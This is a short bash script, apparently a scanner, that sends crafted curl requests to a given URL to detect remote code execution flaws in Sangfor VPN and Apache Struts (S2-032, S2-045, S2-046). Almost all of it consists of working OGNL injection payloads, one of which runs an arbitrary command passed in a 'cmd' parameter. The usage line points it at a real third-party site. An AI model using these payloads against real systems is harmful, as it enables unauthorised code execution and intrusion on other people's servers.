# ./scan.sh http://baidu.com

url=$1
config="--connect-timeout 6 -m 6 -k -s"
payload="$url/"
curl $config  $payload |grep -q "por/login_psw.csp"  && echo "[+] Sangfor VPN  $url" || echo "[-] Sangfor VPN"

payload="$url/por/checkurl.csp?url=-h"
curl $config  $payload |grep -q ^1$  && echo "[+] Sangfor VPN  RCE $payload" || echo "[-] Sangfor VPN  RCE"

payload="$url/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=echo%20AABBCC"

curl $config  $payload |grep -q ^AABBCC  && echo "[+] Apache S2-032 Struts RCE $payload" || echo "[-] Not Apache S2-032 Struts RCE"

payload="$url/"
curl $payload \
$config \
-H 'Proxy-Connection: keep-alive' \
-H 'Cache-Control: max-age=0' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'Origin: http://burpsuite' \
-H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}" \
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
-H 'Referer: http://burpsuite/' \
-H 'Accept-Language: zh-CN,zh;q=0.9' \
--compressed  |grep -q struts2_security_check  && echo "[+] Apache S2-046 Struts RCE $payload" || echo "[-] Not Apache S2-046 Struts RCE"

curl $payload \
$config \
-H 'Accept-Language: zh_CN' \
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
-H 'Content-Type: multipart/form-data; boundary=---------------------------7e116d19044c' \
--data-binary @data.txt \
--compressed |grep -q struts2_security_check  && echo "[+] Apache S2-045 Struts RCE $payload" || echo "[-] Not Apache S2-045 Struts RCE"

payload="$url/index.action"

curl $payload \
    $config \
    -H 'Proxy-Connection: keep-alive' \
    -H 'Cache-Control: max-age=0' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'Origin: http://burpsuite' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
    -H 'Referer: http://burpsuite/' \
    -H 'Accept-Language: zh-CN,zh;q=0.9' \
    --data-raw 'method%3A%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23res.setCharacterEncoding%28%23parameters.encoding%5B0%5D%29%2C%23w%3D%23res.getWriter%28%29%2C%23w.print%28%23parameters.web%5B0%5D%29%2C%23w.print%28%23parameters.path%5B0%5D%29%2C%23w.close%28%29%2C1%3F%23xx%3A%23request.toString=&pp=%2F&encoding=UTF-8&web=struts2_security_&path=check' \
    --compressed |grep -q struts2_security_check  && echo "[+] Apache S2-032 Struts RCE $payload" || echo "[-] Not Apache S2-032 Struts RCE"
